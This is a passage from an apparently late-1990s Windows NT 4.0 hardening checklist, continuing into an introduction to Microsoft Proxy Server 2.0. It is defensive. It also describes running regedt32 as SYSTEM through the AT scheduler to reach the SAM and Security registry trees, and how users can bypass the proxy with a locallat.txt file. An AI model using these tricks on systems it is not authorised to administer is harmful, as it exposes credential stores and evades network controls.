Name:	LMCompatibilityLevel	
Type:	REG_DWORD	
Value:	0,1,2  (Default 0)	

Setting the value to:
? 0 – Send both Windows NT and LM password forms.
? 1 – Send Windows NT and LM password forms only if the server requests it.
? 2 – Never send LM password form.

If a Windows NT client selects level 2, it cannot connect to servers that support only LM 
authentication, such as Windows 95 and Windows for Workgroups.

For more complete information on this hot fix, please refer to Knowledge Base article number 
Q147706.

[6.2.0] Wiping the System Page File during clean system shutdown
	Completed	Not implemented	Not applicable	
STATUS				

Virtual Memory support of Windows NT uses a system page file to swap pages from memory of 
different processes onto disk when they are not being actively used.  On a running system, this 
page file is opened exclusively by the operating system and hence is well-protected.  However, 
systems that are configured to allow booting to other operating systems, may want to ensure that 
system page file is wiped clean when Windows NT shuts down.  This ensures that sensitive 
information from process memory that may have made into the page file is not available to a 
snooping user.  This can be achieved by setting up the following key:

Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	System\CurrentControlSet\Control\SessionManager\Memory Management	
Name:	ClearPageFileAtShutdown	
Type:	REG_DWORD	
Value:	1	

Note that, this protection works only during a clean shutdown, therefore it is important that 
untrusted users do not have ability to power off or reset the system manually.

[6.2.1] Protecting the Registry
	Completed	Not implemented	Not applicable	
STATUS				

All the initialization and configuration information used by Windows NT is stored in the registry. 
Normally, the keys in the registry are changed indirectly, through the administrative tools such as 
the Control Panel. This method is recommended. The registry can also be altered directly, with 
the Registry Editor; some keys can be altered in no other way.

The Registry Editor supports remote access to the Windows NT registry. To restrict network 
access to the registry, use the Registry Editor to create the following registry key:

Hive:	HKEY_LOCAL_MACHINE	
Key:	\CurrentcontrolSet\Control\SecurePipeServers	
Name:	\winreg	

The security permissions set on this key define which users or groups can connect to the system 
for remote registry access. The default Windows NT Workstation installation does not define this 
key and does not restrict remote access to the registry. Windows NT Server permits only 
administrators remote access to the registry.

[6.2.2] Secure EventLog Viewing
	Completed	Not implemented	Not applicable	
STATUS				

Default configuration allows guests and null log ons ability to view event logs (system, and 
application logs).  Security log is protected from guest access by default, it is viewable by users 
who have "Manage Audit Logs" user right.  The Event log services use the following key to 
restrict guest access to these logs:

Hive:	HKEY_LOCAL_MACHINE	
Key:	\System\CurrentControlSet\Services\EventLog\[LogName]	
Name:	RestrictGuestAccess	
Type 	REG_DWORD	
Value:	1	

Set the value for each of the logs to 1.  The change takes effect on next reboot.  Needless to say 
that you will have to change the security on this key to disallow everyone other than 
Administrators and System any access because otherwise malicious users can reset these 
values.

[6.2.3] Secure Print Driver Installation
	Completed	Not implemented	Not applicable	
STATUS				

Registry key AddPrinterDrivers under HKEY_LOCAL_MACHINE\System\CurrentControlSet\ 
Control\Print\Providers\LanMan Print Services\Servers, Key value AddPrinterDrivers 
(REG_DWORD) is used to control who can add printer drivers using the print folder.  This key 
value should be set to 1 to enable the system spooler to restrict this operation to administrators 
and print operators (on server) or power users (on workstation).

Hive:	HKEY_LOCAL_MACHINE	
Key:	System\CurrentcontrolSet\Control\Print\Providers\LanMan Print Services\Servers	
Name:	AddPrintDrivers	
Type 	REG_DWORD	
Value:	1	

[6.2.4] The Schedule Service (AT Command)
	Completed	Not implemented	Not applicable	
STATUS				

The Schedule service (also known as the AT command) is used to schedule tasks to run 
automatically at a preset time. Because the scheduled task is run in the context run by the 
Schedule service (typically the operating system's context), this service should not be used in a 
highly secure environment. 
By default, only administrators can submit AT commands. To allow system operators to also 
submit AT commands, use the Registry Editor to create or assign the following registry key value:

Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	\CurrentControlSet\Control\Lsa	
Name:	Submit Control	
Type:	REG_DWORD	
Value:	1	

There is no way to allow anyone else to submit AT commands.  Protecting the registry as 
explained earlier restricts direct modification of the registry key using the registry editor.  Access 
to the registry key HKEY_LOCAL_MACHINE\System\CurrentControlSet\ Services\Schedule 
should also be restricted to only those users/groups (preferrably Administrators only) that are 
allowed to submit jobs to the schedule service.
The changes will take effect the next time the computer is started. You might want to update the 
Emergency Repair Disk to reflect these changes.

[6.2.5] Secure File Sharing
	Completed	Not implemented	Not applicable	
STATUS				

The native Windows NT file sharing service is provided using the SMB-based server and 
redirector services.  Even though only administrators can create shares, the default security 
placed on the share allows Everyone full control access.  These permissions are controlling 
access to files on down level file systems like FAT which do not have security mechanisms built 
in.  Shares on NTFS enforce the security on the underlying directory it maps to and it is 
recommended that proper security be put via NTFS and not via the file sharing service.

Also note that the share information resides in the registry which also needs to be protected as 
explained in a section earlier.

? Service Pack 3 for Windows NT version 4.0 includes several enhancements to SMB based 
file sharing protocol.  These are:It supports mutual authentication to counter man-in-the-
middle attacks.
? It supports message authentication to prevent active message attacks.

These are provided by incorporating message signing into SMB packets which are verified by 
both server and client ends.  There are registry key settings to enable SMB signatures on each 
side.  To ensure that SMB server responds to clients with message signing only, configure the 
following key value:

Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	System\CurrentControlSet\Services\LanManServer\Parameters	
Name:	RequireSecuritySignature	
Type:	REG_DWORD	
Value:	1	

Setting this value ensures that the Server communicates with only those clients that are aware of 
message signing.  Note that this means that installations that have multiple versions of client 
software, older versions will fail to connect to servers that have this key value configured.

Similarly, security conscious clients can also decide to communicate with servers that support 
message signing and no one else.

Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	System\CurrentControlSet\Services\Rdr\Parameters	
Name:	RequireSecuritySignature	
Type:	REG_DWORD	
Value:	1	

Note that setting this key value implies that the client will not be able to connect to servers which 
do not have message signing support.

Please refer to Knowledge Base article Q161372 for further details on SMB message signing 
enhancements.

Windows NT version 4.0 Service Pack 3 also includes another enhancement to SMB file sharing 
protocol such that by default you are unable to connect to SMB servers (such as Samba or 
Hewlett-Packard (HP) LM/X or LAN Manager for UNIX) with an unencrypted (plain text) 
password.  This protects from sending clear text forms of passwords over the wire.  Please refer 
to Knowledge base article Q166730 if you have any reasons to allow clients to send unencrypted 
passwords over the wire.

Additionally, customers may want to delete the administrative shares ($ shares) if they are not 
needed on an installation.  This can be accomplished using "net share" command.  For example:
C:\> net share admin$ /d

[6.2.6] Auditing
Auditing can inform you of actions that could pose a security risk and also identify the user 
accounts from which audited actions were taken. Note that auditing only tells you what user 
accounts were used for the audited events. If passwords are adequately protected, this in turn 
indicates which user attempted the audited events. However, if a password has been stolen or if 
actions were taken while a user was logged on but away from the computer, the action could 
have been initiated by someone other than the person to whom the user account is assigned
When you establish an audit policy you'll need to weigh the cost (in disk space and CPU cycles) 
of the various auditing options against the advantages of these options. You'll want to at least 
audit failed log on attempts, attempts to access sensitive data, and changes to security settings. 
Here are some common security threats and the type of auditing that can help track them:

[6.2.7] Threat	Action	
Hacker-type break-in using random passwords	Enable failure auditing for log on and log off 
events.	
Break-in using stolen password	Enable success auditing for log on and log off events. The log 
entries will not distinguish between the real users and the phony ones. What you are looking for 
here is unusual activity on user accounts, such as log ons at odd hours or on days when you 
would not expect any activity.	
Misuse of administrative privileges by authorized users	Enable success auditing for use of user 
rights; for user and group management, for security policy changes; and for restart, shutdown, 
and system events. (Note: Because of the high volume of events that would be recorded, 
Windows NT does not normally audit the use of the Backup Files And Directories and the Restore 
Files And Directories rights. Appendix B, "Security In a Software Development Environment," 
explains how to enable auditing of the use of these rights.)	
Virus outbreak	Enable success and failure write access auditing for program files such as files 
with .exe and .dll extensions. Enable success and failure process tracking auditing. Run suspect 
programs and examine the security log for unexpected attempts to modify program files or 
creation of unexpected processes. Note that these auditing settings generate a large number of 
event records during routine system use. You should use them only when you are actively 
monitoring the system log.	
Improper access to sensitive files	Enable success and failure auditing for file- and object-
access events, and then use File Manager to enable success and failure auditing of read and 
write access by suspect users or groups for sensitive files.	
Improper access to printers	Enable success and failure auditing for file- and object-access 
events, and then use Print Manager to enable success and failure auditing of print access by 
suspect users or groups for the printers.	

[6.2.8] Enabling System Auditing
	Completed	Not implemented	Not applicable	
STATUS				

Enabling system auditing can inform you of actions that pose security risks and possibly detect 
security breaches.
To activate security event logging, follow these steps: 
1.	Log on as the administrator of the local workstation. 
2.	Click the Start button, point to Programs, point to Administrative Tools, and then click User 
Manager. 
3.	On the Policies menu, click Audit. 
4.	Click the Audit These Events option. 
5.	Enable the options you want to use. The following options are available: 
•	Log on/Log off: Logs both local and remote resource logins.
•	File and Object Access: File, directory, and printer access.
•	Note: Files and folders must reside on an NTFS partition for security logging to be 
enabled. Once the auditing of file and object access has been enabled, use Windows 
NT Explorer to select auditing for individual files and folders.
•	User and Group Management: Any user accounts or groups created, changed, or 
deleted. Any user accounts that are renamed, disabled, or enabled. Any passwords set 
or changed.
•	Security Policy Changes: Any changes to user rights or audit policies.
•	Restart, Shutdown, And System: Logs shutdowns and restarts for the local workstation.
•	Process Tracking: Tracks program activation, handle duplication, indirect object 
access, and process exit.
6.	Click the Success check box to enable logging for successful operations, and the Failure 
check box to enable logging for unsuccessful operations.
7.Click OK.

Note that Auditing is a "detection" capability rather than "prevention" capability.  It will help you 
discover security breaches after they occur and therefore should always be consider in addition to 
various preventive measures.

[6.2.9] Auditing Base Objects
	Completed	Not implemented	Not applicable	
STATUS				

To enable auditing on base system objects, add the following key value to the registry key 

Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	System\CurrentControlSet\Control\Lsa	
Name:	AuditBaseObjects	
Type:	REG_DWORD	
Value:	1	

Note that simply setting this key does not start generating audits.  The administrator will need to 
turn auditing on for the "Object Access" category using User Manager.  This registry key setting 
tells Local Security Authority that base objects should be created with a default system audit 
control list.

[6.3.0] Auditing of Privileges
	Completed	Not implemented	Not applicable	
STATUS				

Certain privileges in the system are not audited by default even when auditing on privilege use is 
turned on.  This is done to control the growth of audit logs.  The privileges are:
1.	Bypass traverse checking (given to everyone).
2.	Debug programs (given only to administrators)
3.	Create a token object (given to no one)
4.	Replace process level token (given to no one)
5.	Generate Security Audits (given to no one)
6.	Backup files and directories (given to administrators and backup operators)
7.	Restore files and directories (given to administrators and backup operators)

1 is granted to everyone so is meaningless from auditing perspective.  2 is not used in a working 
system and can be removed from administrators group.  3, 4 and 5 are not granted to any user or 
group and are highly sensitive privileges and should not be granted to anyone.  However 6 and 7 
are used during normal system operations and are expected to be used.  To enable auditing of 
these privileges, add the following key value to the registry key 

Hive:	HKEY_LOCAL_MACHINE\SYSTEM	
Key:	System\CurrentControlSet\Control\Lsa	
Name:	FullPrivilegeAuditing	
Type:	REG_BINARY	
Value:	1	

Note that these privileges are not audited by default because backup and restore is a frequent 
operation and this privilege is checked for every file and directory backed or restored, which can 
lead to thousands of audits filling up the audit log in no time.  Carefully consider turning on 
auditing on these privilege uses.




[6.3.1] Protecting Files and Directories
	Completed	Not implemented	Not applicable	
STATUS				

The NTFS file system provides more security features than the FAT system and should be used 
whenever security is a concern. The only reason to use FAT is for the boot partition of an ARC-
compliant RISC system. A system partition using FAT can be secured in its entirety using the 
Secure System Partition command on the Partition menu of the Disk Administrator utility.

Among the files and directories to be protected are those that make up the operating system 
software itself. The standard set of permissions on system files and directories provide a 
reasonable degree of security without interfering with the computer's usability. For high-level 
security installations, however, you might want to additionally set directory permissions to all 
subdirectories and existing files, as shown in the following list, immediately after WindowsNT is 
installed. Be sure to apply permissions to parent directories before applying permissions to 
subdirectories.

First apply the following using the ACL editor:

Directory	Permissions	Complete	
\WINNT and all subdirectories under it.		Administrators: Full Control
CREATOR OWNER: Full Control
Everyone: Read
SYSTEM: Full Control		

Now, within the \WINNT tree, apply the following exceptions to the general security:

Directory	Permissions	Complete	
\WINNT\REPAIR		Administrators: Full Control		
\WINNT\SYSTEM32\CONFIG		Administrators: Full Control
CREATOR OWNER: Full Control
Everyone: List
SYSTEM: Full Control		
\WINNT\SYSTEM32\SPOOL		Administrators: Full Control
CREATOR OWNER: Full Control
Everyone: Read
Power Users: Change
SYSTEM: Full Control		
\WINNT\COOKIES
\WINNT\FORMS
\WINNT\HISTORY
\WINNT\OCCACHE
\WINNT\PROFILES
\WINNT\SENDTO
\WINNT\Temporary Internet Files	Administrators: Full Control
CREATOR OWNER: Full Control
Everyone: Special Directory Access – Read, Write and Execute, Special File Access – None 
System : Full Control		

Several critical operating system files exist in the root directory of the system partition on Intel 
80486 and Pentium-based systems. In high-security installations you might want to assign the 
following permissions to these files:

File	C2-Level Permissions	Complete	
\Boot.ini, \Ntdetect.com, \Ntldr		Administrators: Full Control
SYSTEM: Full Control		
\Autoexec.bat, \Config.sys	Everybody: Read
Administrators: Full Control
SYSTEM: Full Control		
\TEMP directory	Administrators: Full Control
SYSTEM: Full Control
CREATOR OWNER: Full Control
Everyone: Special Directory Access – Read, Write and Execute, Special File Access – None 	
	

To view these files in File Manager, choose the By File Type command from the View menu, 
then select the Show Hidden/System Files check box in the By File Type dialog box.

Note that the protections mentioned here are over and above those mentioned earlier in the 
standard security level section, which included having only NTFS partitions (except the boot 
partition in case of RISC machines).  The FAT boot partition for RISC systems can be configured 
using the Secure System Partition command on the Partition menu of the Disk Administrator 
utility. 

It is also highly advisable that Administrators manually scan the permissions on various partitions 
on the system and ensures that they are appropriately secured for various user accesses in their 
environment.

[6.3.2] Services and NetBIOS Access From Internet

EventLog			
FTP Publishing Service (for FTP server)			
Gopher Publishing Service (for Gopher server)			
NT LM Security Support Provider			
Remote Procedure Call (RPC) Service

The following services MAY be started if needed:

Service	Installed	Not Installed	
Schedule			
UPS			

Disconnect the "NetBIOS Interface", the "Server" and the "Workstation" from the "WINS 
Client(TCP/IP)"

[6.3.3] Alerter and Messenger Services 

The Windows NT alerter and messenger services enable a user to send pop-up messages to 
other users. A network administrator may consider this an unnecessary risk due to the fact that 
these types of services have been known to be used in social engineering attacks. Some users 
might actually respond to a request to change their password, create a share, or otherwise open 
holes in the network. A side effect of running this service is that it causes the name of the current 
user to be broadcast in the NetBIOS name table, which gives the attacker a valid user name to 
use in brute force attempts. 

[6.3.4] Unbind Unnecessary Services from Your Internet Adapter Cards 

	Completed	Not implemented	Not applicable	
STATUS				

Use the Bindings feature in the Network application in Control Panel to unbind any unnecessary 
services from any network adapter cards connected to the Internet. For example, you might use 
the Server service to copy new images and documents from computers in your internal network, 
but you might not want remote users to have direct access to the Server service from the Internet. 

If you need to use the Server service on your private network, disable the Server service binding 
to any network adapter cards connected to the Internet. You can use the Windows NT Server 
service over the Internet; however, you should fully understand the security implications and 
comply with Windows NT Server Licensing requirements issues. 

When you are using the Windows NT Server service you are using Microsoft networking (the 
server message block [SMB] protocol rather than the HTTP protocol) and all Windows NT Server 
Licensing requirements still apply. HTTP connections do not apply to Windows NT Server 
licensing requirements. 

For Windows NT systems with direct Internet connectivity and have NetBios, there are two 
configuration options:
•	Configure the NT system on the Internet outside the corporate firewall. You can also 
accomplish this by blocking ports 135, 137 and 138 on TCP and UDP protocols at the 
firewall.  This ensures that no NetBIOS traffic moves across the corporate firewall.
•	Configure the protocol bindings between TCP/IP, NetBIOS, Server and Workstation 
services using the network control panel.  By removing the bindings between NetBIOS and 
TCP/IP, the native file sharing services (using the Server and Workstation services) will not 
be accessible via TCP/IP and hence the Internet.  These and other NetBIOS services will 
still be accessible via a local LAN-specific, non-routable protocol (ex: NetBEUI) if one is in 
place.  To accomplish this use the Network Control Panel applet.  Select the Bindings Tab 
and disable the NetBios bindings with TCP/IP protocol stack.

A Windows NT system with direct Internet connectivity needs to be secured with respect to other 
services besides NetBIOS access, specifically Internet Information Server

NetBIOS over TCP/IP should normally be disabled for a firewall or web server.  The following is a 
list of the ports used by NBT.
? NetBIOS-ns 137/tcp NETBIOS Name Service 
? NetBIOS-ns 137/udp NETBIOS Name Service 
? NetBIOS-dgm 138/tcp NETBIOS Datagram Service 
? NetBIOS-dgm 138/udp NETBIOS Datagram Service 
? NetBIOS-ssn 139/tcp NETBIOS Session Service 
? NetBIOS-ssn 139/udp NETBIOS Session Service

[6.3.5] Enhanced Protection for Security Accounts Manager Database

	Completed	Not implemented	Not applicable	
STATUS				

The Windows NT Server 4.0 System Key hotfix (included in Service Pack 3) provides the 
capability to use strong encryption techniques to increase protection of account password 
information stored in the registry by the Security Account Manager (SAM). Windows NT Server 
stores user account information, including a derivative of the user account password, in a secure 
portion of the Registry protected by access control and an obfuscation function. The account 
information in the Registry is only accessible to members of the Administrators group. Windows 
NT Server, like other operating systems, allows privileged users who are administrators access to 
all resources in the system. For installations that want enhanced security, strong encryption of 
account password derivative information provides an additional level of security to prevent 
Administrators from intentionally or unintentionally accessing password derivatives using Registry 
programming interfaces. 

Please refer to Knowledge Base article Q143475 for more details on SysKey feature and how it 
can be implemented on a Windows NT installation.

[6.3.6] Disable Caching of Logon Credentials during interactive logon.

	Completed	Not implemented	Not applicable	
STATUS				

The default configuration of Windows NT caches the last logon credentials for a user who logged 
on interactively to a system.  This feature is provided for system availability reasons such as the 
user's machine is disconnected or none of the domain controllers are online.

Even though the credential cache is well protected, in a highly secure environments, customers 
may want to disable this feature.  This can be done by setting the following registry key:

Hive:	HKEY_LOCAL_MACHINE	
Key:	Software\Microsoft\Windows NT\CurrentVersion\Winlogon	
Name:	CachedLogonsCount	
Type:	REG_DWORD	
Value:	0	


[6.3.7] How to secure the %systemroot%\repair\sam._ file

	Completed	Not implemented	Not applicable	
STATUS				

By default, the SAM._ file and \repair directory has the following permissions; 

Administrators: Full Control 
Everyone: Read 
SYSTEM: Full Control 
Power Users: Change

1.From within Explorer, highlight the SAM._ file, right click, choose properties, security, 
permissions. Remove all privilege from this file.
2.From a DOS prompt, execute the following;

cacls %systemroot%\repair\sam._ /D Everyone

This will deny the group Everyone permission to the file, ensuring that no other permission (i.e. 
inherited permissions from a share) can override the file permission.
3.Whenever you need to update your ERD, first execute the following from a DOS prompt; 

cacls %systemroot%\repair\sam._ /T /G Administrators:C

This will grant Administrators change permission to update it during the ERD update. 

4.Once the ERD has been updated, execute the following from a DOS prompt;

cacls %systemroot%\repair\sam._ /E /R Administrators

This will once again remove the permissions for Administrator 

How to enable auditing on password registry keys

1.First you have to make sure auditing is enabled. Start User Manager, Policies, Audit, and click 
"Audit These Events".
2.By default, Windows NT does not identify any users or groups to audit on any objects within the 
system. Auditing can add performance overhead to your system depending on the available 
resources, so care should be taken in determining what and whom to audit. For a full 
description of auditing in Windows NT, I recommend the Microsoft Press book "Windows NT 
3.5 - Guidelines for Security, Audit, and Control", ISBN 1-55615-814-9. Despite its title it is 
still the most comprehensive coverage of auditing that I have read. For the sake of this 
example, we will simply check every Success and Failure checkbox. 
3.Close the dialog. 
4.Now for a little known trick. While logged on as Administrator, ensure that the Schedule service 
is set to start up as the System account. Once set, start the Schedule service. 
5.Check the time, and then open a DOS prompt. At the DOS prompt, type in the following; at 
22:48 /interactive "regedt32.exe" where 22:48 gets replaced with the current time plus 1 
minute (or 2 or whatever amount of time you think it will take you to type in the command).
6.At the designated time, regedt32.exe will fire up and appear on your desktop. This incarnation 
of regedt32.exe will be running in the security context of the user SYSTEM. As such, you will 
be able to see the entire registry, every key within the SAM or Security trees. BE VERY 
CAREFUL HERE. It is important to note that when running an application as SYSTEM, it 
does so attempting to use null session for credentials. Null session support has been 
disabled by default in all versions of Windows NT after 3.1, therefore any attempt to connect 
to non-local resources as this security context will fail. An Administrator could enable null 
session support through the registry, but such a configuration is strongly discouraged. 
7.All we want to do is enable auditing on the designated keys, nothing else. To this end, we 
highlight the HKEY_LOCAL_MACHINE windows within regedt32. Next highlight the SAM 
tree. Choose the Security menu item, then Auditing. 
8.Click on the Add button and choose Show Users.
9.I'm going to recommend that you add the SYSTEM user, the group Domain Admins, and the 
user Administrator. You want to cover any account which has the right to;
? "Take ownership of files or other objects"
? "Back up files and directories"
? "Manage auditing and security log"
? "Restore files and directories"
? "Add workstations to domain"
? "Replace a process level token" 
10.Click the Audit Permission on Existing Subkeys 
11.Next, click in the Success and Failure checkboxes for the following entries; - Query Value - 
Set Value - Write DAC - Read Control
12.Choose OK, and then Yes. 
13.Repeat the process for the Security tree.
14.Close REGEDT32, and stop the Schedule service. You will want to set the Schedule service 
to use a userID for startup which you create, rather than SYSTEM, in future. Take this 
opportunity to create such a user and change the startup for Schedule. 

You will now have applied auditing to the entire SAM ensuring you'll be notified via the Event 
Logger of any failed or successful access to your sensitive information by the only accounts 
which have the ability to access such information. The issue of what to do when/if you discover 
event notifications is beyond the scope of this document. Part of a good security policy is an 
appropriate audit policy which would dictate how the event logs are reviewed, how the information 
is verified, and what actions should be taken for each possible event.

[6.3.8] TCP/IP Security in NT

Note: This section is not meant to teach you the concepts behind the TCP/IP protocol. It is 
assumed that a working knowledge of TCP/IP can be applied.

	Windows NT has a built in TCP/IP security functionality that most people do not use or 
know about. This functionality enables you to control the types of network traffic that can reach 
your NT servers. Access can be allowed or denied based on specific TCP ports, UDP ports, and 
IP protocols. This type of security is normally applied to servers connected directly to the internet, 
which is not recommended.
	Do configure NT's built in TCP/IP security, follow these steps:

	1 - Right click on Network Neighborhood and goto the properties option.
	2 - Select the Protocols tab, highlight TCP/IP and click on Properties.
	3 - Select the IP address tab of the TCP/IP properties screen.
	4 - Check the check box that reads "Enable Security".
	5 - Click on Configure
	
	You should now be looking at the TCP/IP Security dialog, which has the following 
options:

	-Adapter: Specifies which of the installed network adapter cards you are configuring
	-TCP Ports
	-UDP Ports
	-IP Protocols

	Within these settings, you would choose which ports and what access permissions you 
would like to assign to those ports. The following list is a list of the well known TCP/IP ports. This 
is not an in depth guide, just a quick reference (For more details, check RFC 1060).

[7.0.0] Preface to Microsoft Proxy Server
This section was not made for people who have been working with Microsoft Proxy Server since 
its beta (catapult) days. It is made for individuals who are curious about the product and security 
professionals that are curious as to what Microsoft Proxy Server has to offer. This section is also 
being written for individuals have a general idea of what a Proxy Server does, but wants to know 
more. This section goes into discussion of Proxy Server Features and Architecture, Access 
Control, Encryption, and Firewall Strategies (which I have been getting a lot of requests for).

The second part of the documentation goes into Firewall types and strategies, so if that's the 
reason you downloaded the documentation, go straight to page 8 I believe.

[7.0.1] What is Microsoft Proxy Server?
Microsoft Proxy Server is a "firewall" and cache server. It provides additional Internet security and 
can improve network response issues depending on its configuration. The reason I put the word 
firewall in quotes is because Proxy Server should not be considered as a stand-alone solution to 
a firewall need. When you are done reading this document, you will have an advanced 
understanding of the Proxy Server product and also understand firewall techniques and 
topologies. 

Proxy Server can be used as an inexpensive means to connect an entire business through only 
one valid IP address. It can also be used to allow more secure inbound connections to your 
internal network from the Internet. By using Proxy Server, you are able to better secure your 
network against intrusion. It can be configured to allow your entire internal private network to 
access resources on the Internet, at the same time blocking any inbound access.

Proxy Server can also be used to enhance the performance of your network by using advanced 
caching techniques. The can be configured to save local copies of requested items from the 
Internet. The next time that item is requested, it can be retrieved from the cache without having to 
connect to the original source. This can save an enormous amount of time and network 
bandwidth. 

Unlike Proxy Server 1.0, Proxy Server 2.0 includes packet filtering and many other features that 
we will be discussing.

Proxy Server provides it functionality by using three services:

? Web Proxy: The web proxy service supports HTTP, FTP, and Gopher for TCP/IP Clients.
? WinSock Proxy: The Winsock proxy supports Windows Sockets client applications. It 
provides support for clients running either TCP/IP or IPX/SPX. This allows for networks that 
may be running more of a Novell environment to still take advantage of Proxy Server.
? SOCKS Proxy: The SOCKS Proxy is a cross-platform service that allows for secure 
communication in a client/server capacity. This service supports SOCKS version 4.3a and 
allows users access to the Internet by means of Proxy Server. SOCKS extends the 
functionality provided by the WinSock service to non-Windows platforms such as Unix or 
Macintosh. 

[7.0.2] Proxy Servers Security Features

In conjunction with other products, Proxy Server can provide firewall level security to prevent 
access to your internal network.
? Single Contact Point: A Proxy Server will have two network interfaces. One of these network 
interfaces will be connected to the external (or "untrusted") network, the other interface will be 
connected to your internal (or "trusted") network. This will better secure your LAN from 
potential intruders. 
? Protection of internal IP infrastructure: When IP forwarding is disabled on the Proxy Server, 
the only IP address that will be visible to the external environment will be the IP address of 
the Proxy Server. This helps in preventing intruders from finding other potential targets on 
your network.
? Packet Layer Filtering: Proxy Server adds dynamic packet filtering to its list of features. With 
this feature, you can block or enable reception of certain packet types. This enables you to 
have a tremendous amount of control over your network security.

[7.0.3] Beneficial Features of Proxy

? IIS and NT Integration: Proxy Server integrates with Windows NT and Internet Information 
Server tighter than any other package available on the market. Proxy Server actually uses 
the same administrative interface used by Internet Information Server. 
? Bandwidth Utilization: Proxy Server allows all clients in your network to share the same link to 
the external network. In conjunction with Internet Information Server, you can set aside a 
certain portion of your bandwidth for use by your webserver services.
? Caching Mechanisms: Proxy Server supports both active and passive caching. These 
concepts will be explained in better detail further into the document.
? Support for Web Publishing: Proxy Server uses a process known as reverse proxy to provide 
security while simultaneously allowing your company to publish on the Internet. Using 
another method known as reverse hosting, you can also support virtual servers through 
Proxy.

[7.0.4] Hardware and Software Requirements

Microsoft suggests the following minimum hardware requirements.

? Intel 486 or higher. RISC support is also available.
? 24 MB Ram for Intel chips 32 MB Ram for RISC.
? 10 MB Diskspace needed for installation. 100 MB + .5 MB per client for Cache space.
? 2 Network interfaces (Adapters, Dial-Up, etc)

Following is the suggested minimum software requirements.

? Windows NT server 4.0
? Internet Information Server 2.0
? Service Pack 3
? TCP/IP

It is highly recommended that it be installed on an NTFS partition. If a NTFS partition is not used, 
not only are you losing NTFS's advanced security features, but also the caching mechanisms of 
Proxy Server will not work.

It is also recommended that your two network interfaces be configured prior to installation. On 
interface configured to the external network, and one configured for the internal network. (Note: 
When configuring your TCP/IP settings, DO NOT configure a default gateway entry for your 
internal network interface.)

? Be sure that "Enable IP Forwarding" is not checked in your TCP/IP settings. This could 
seriously compromise your internal security.

[7.0.5] What is the LAT?

This is probably one of the most common questions I am asked as a security professional. The 
LAT, or Local Address Table, is a series of IP address pairs that define your internal network. 
Each pair defines a range of IP addresses or a single pair.

That LAT is generated upon installation of Proxy Server. It defines the internal IP addresses. 
Proxy Server uses the Windows NT Routing Table to auto-generate the LAT. It is possible that 
the when the LAT is auto-generated, that errors in the LATs construction will be found. You 
should always manually comb through the LAT and check for errors. It is not uncommon to find 
external IP addresses in the LAT, or entire subnets of your internal IP addresses will not appear 
on the LAT. It is generally a good idea to have all of your internal IP addresses in the LAT.

? NO EXTERNAL IP ADDRESSES SHOULD APPEAR IN YOUR LAT.

Upon installing the Proxy Server client software, it adds a file named msplat.txt into the \Mspclnt 
directory. The msplat.txt file contains the LAT. This file is regularly updated from the server to 
ensure that the LAT the client is using is current.

[7.0.6] What is the LAT used for?

Every time a client attempts to use a Winsock application to establish a connection, the LAT is 
referenced to determine if the IP address the client is attempting to reach is internal or external. If 
the IP address is internal, Proxy Server is bypassed and the connection is made directly. If the IP 
address the client is attempting to connect to DOES NOT appear in the LAT, it is determined that 
the IP address is remote and the connection is made through Proxy Server. By knowing this 
information, someone on your internal network could easily edit his or her LAT table to bypass 
Proxy Server. 

Some Administrators may not see this as a problem because the LAT is regularly updated from 
the server, so any changes the user made to his or her LAT will be overwritten. However, if the 
user saves their LAT with the filename Locallat.txt, the client machine will reference both the 
msplat.txt and the locallat.txt to determine if an IP address is local or remote. So, by using the 
locallat.txt method, a user can, in theory, permanently bypass Proxy Server. The locallat.txt file is 
never overwritten unless the user does so manually.

[7.0.7] What changes are made when Proxy Server is installed?

Server side changes:

? The Web Proxy, Winsock Proxy, and SOCKS Proxy services are installed and management 
items are added into the Internet Service Manager.
? An HTML version of the documentation is added into the %systemroot%\help\proxy\ 
directory.
? A cache area is created on an NTFS volume.
? The LAT table is constructed.
? Proxy Server Performance Monitor counters are added.
? Client installation and config files are added to the Msp\Clients folder. This folder is shared as 
Mspclnt and by default has the permissions set to Read for Everyone.

Client side changes:
? The LAT (msplat.txt) file is copied to the clients local hard drive.
? A WSP Client icon is added to control panel on Win3.X, Win95 and WinNT clients.
? A Microsoft Proxy Client Program Group is added
? The winsock.dll file is replace with Remote WinSock for Proxy. The old winsock file is 
renamed winsock.dlx.
? Mspclnt.ini file is copied to the client machine.

[7.0.8] Proxy Server Architecture

To understand the architecture of Microsoft Proxy Server, you must first have a basic grasp of 
how Proxy works for outbound client requests. Here is a simple example:

Joe opens his browser to visit his favorite news site on the net. He types in the sites IP address 
which he has memorized because his visits often, instead of doing his job. The client compares 
the IP address Joe entered to the LAT table. Because the IP address is not found on the LAT, it is 
considered external. Since the client has determined that the IP address is external, it knows it 
must process the request through Proxy Server. The client hands Joe's request to Proxy Server. 
Proxy Server then checks the IP address against the access control applied by the Administrator. 
The Administrator has the ability to stop internal employees from visiting certain sites. Since Joe's 
request is not on the forbidden list applied by the Administrator, Proxy Server executes the 
request. Proxy contacts the website and requests the document Joe wanted. After Proxy server 
has received the information it requested, it stored a copy in its cache for later use and hands the 
request to the client machine. The website pops-up on Joe's browser.

[7.0.9] Proxy Server Services: An Introduction

? WebProxy: Web Proxy normally functions with both clients and servers. As a server, it 
receives HTTP requests from internal network clients. As a client, it responds to internal 
network clients' requests by issuing their requests to a server on the Internet. The interface 
between the client and server components of the Web Proxy service provides chances to add 
value to the connections it services. By performing advanced security checks, the Web Proxy 
does more than relay requests between an internal client and a server on the Internet. The 
WebProxy service is an extensions of Internet Information Server 3.0. It consists of two 
following components: The Proxy Server ISAPI Filter and the Proxy Server ISAPI Application. 
The Web Proxy service is implemented as a DLL (dynamic link library) that uses ISAPI 
(Internet Server Application Programming Interface) and therefore runs within the IIS WWW 
process. The WWW Service must installed and running in order for proxy requests to be 
processed.
? WinSock Proxy: WinSock Proxy provides proxy services for windows sockets applications. 
WinSock Proxy allows winsock applications to function on a LAN and to operate as if it is 
directly connected to the Internet. The client app uses Windows Sockets APIs to 
communicate with another application running on an Internet computer. WinSock Proxy 
intercepts the windows sockets call and establishes a communication path from the internal 
application to the Internet application through the proxy server. The process is totally 
transparent to the client. The WinSock Proxy consists of a service running on Proxy Server 
and a DLL installed on each client. The DLL it relies on is the Remote Winsock DLL that 
replaced the normal winsock.dll. WinSock Proxy uses a control channel between the client 
